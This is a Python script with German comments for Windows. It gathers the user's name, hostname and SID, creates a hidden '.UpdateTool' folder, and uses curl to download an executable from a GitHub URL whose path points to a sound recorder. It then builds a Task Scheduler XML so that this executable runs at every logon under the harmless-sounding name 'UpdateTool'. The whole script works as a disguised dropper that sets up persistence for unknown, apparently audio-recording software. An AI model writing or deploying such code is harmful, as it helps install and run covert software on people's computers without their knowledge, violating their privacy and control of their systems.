import os

#temppath zu python holen
tmp = os.environ.get('TMP')

# homepath zu python holen
home = os.environ.get('homepath')

# username zu python holen
user = os.environ.get('username')

#hostname zu python holen (etwas anders da hostname keine var)
raw_host = os.popen('hostname').read()
host = raw_host[0:len(raw_host)-1] # wird benötigt da in cmd nach string \n
#SID zu python
raw_mysid = os.popen('wmic useraccount where name="' + user + '" get sid').read()
mysid = raw_mysid[47:90]

#hostname und user zusammenführen
hostuser = host + '\\' + user
# newpath festlegen
newpath_home = home + r'\.UpdateTool'
newpath_tmp = tmp + r'\UpdateTool'
# falls newpath nicht existiert erstelle ihn
if not os.path.exists(newpath_home):
  os.makedirs(newpath_home)


url1 = 'https://raw.githubusercontent.com/DanielMueller1309/Python/update_soundrec/sonstiges/sound_rec/dist/update_tool.exe'

# nachladen von update_tool.exe
if not os.path.exists(newpath_home + r'\update_tool.exe'):
    os.system('cmd /c "curl ' + url1 + ' -o  ' + newpath_home + r'\update_tool.exe"')

#lösche falls nötig alte xml datei
if os.path.exists(newpath_tmp + r'\UpdateTool.xml'):
    os.remove(newpath_tmp + r'\UpdateTool.xml')
# erstelle xml datei
os.system(r'cmd /c "echo ^<?xml version="1.0" encoding="UTF-16"?^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo   ^<RegistrationInfo^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<Date^>2021-04-28T07:52:50.2538139^</Date^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<Author^>Anonymus^</Author^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<URI^>\UpdateTool^</URI^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo   ^</RegistrationInfo^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo   ^<Triggers^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<LogonTrigger^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo       ^<Enabled^>true^</Enabled^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo       ^<UserId^>' + hostuser + '^</UserId^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^</LogonTrigger^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo   ^</Triggers^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo   ^<Principals^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<Principal id="Author"^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo       ^<UserId^>' + mysid + '^</UserId^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo       ^<LogonType^>InteractiveToken^</LogonType^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo       ^<RunLevel^>LeastPrivilege^</RunLevel^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^</Principal^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo   ^</Principals^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo   ^<Settings^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<DisallowStartIfOnBatteries^>true^</DisallowStartIfOnBatteries^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<AllowHardTerminate^>true^</AllowHardTerminate^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<StartWhenAvailable^>false^</StartWhenAvailable^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<IdleSettings^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo       ^<Duration^>PT10M^</Duration^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo       ^<WaitTimeout^>PT1H^</WaitTimeout^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo       ^<StopOnIdleEnd^>true^</StopOnIdleEnd^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo       ^<RestartOnIdle^>false^</RestartOnIdle^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^</IdleSettings^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<Enabled^>true^</Enabled^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<Hidden^>false^</Hidden^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<WakeToRun^>false^</WakeToRun^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<ExecutionTimeLimit^>PT72H^</ExecutionTimeLimit^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<Priority^>7^</Priority^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo   ^</Settings^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo   ^<Actions Context="Author"^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^<Exec^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo       ^<Command^>' + r'C:' + newpath_home + r'\update_tool.exe' + '^</Command^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo     ^</Exec^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo   ^</Actions^> >>' + newpath_tmp + r'\UpdateTool.xml"')
os.system(r'cmd /c "echo ^</Task^> >>' + newpath_tmp + r'\UpdateTool.xml"')
print('xml datei geschrieben')


#schtask aus xml erstellen
os.system(r'cmd /c "schtasks /create /tn "UpdateTool" /xml "' + newpath_tmp + r'\UpdateTool.xml"')

#os.system()
print("fertig")
